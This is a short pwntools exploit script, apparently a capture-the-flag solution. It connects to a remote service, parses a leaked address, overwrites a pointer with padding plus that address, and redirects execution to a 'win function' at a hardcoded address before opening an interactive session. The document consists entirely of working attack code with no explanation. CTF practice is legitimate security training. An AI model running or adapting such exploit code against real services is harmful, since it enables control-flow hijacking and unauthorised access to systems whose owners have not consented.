from pwn import *

#connect 138.68.188.223:30002
r= remote("138.68.183.64",30855)
r.sendafter(b'>> ', b'1')
r.recvuntil(b'serial number: [')
a = int(r.recvuntil(b']')[:-1],10)
a -= 16
r.sendafter(b'>> ', b'2')
r.sendafter(b'*] Write some code: ',b'a'*8+p64(a)) #__do_global_dtors_aux
r.sendafter(b'>> ', b'3')
r.sendafter(b'>> ', b"2")
r.sendline(p64(0x0400977)) #win function
r.interactive()
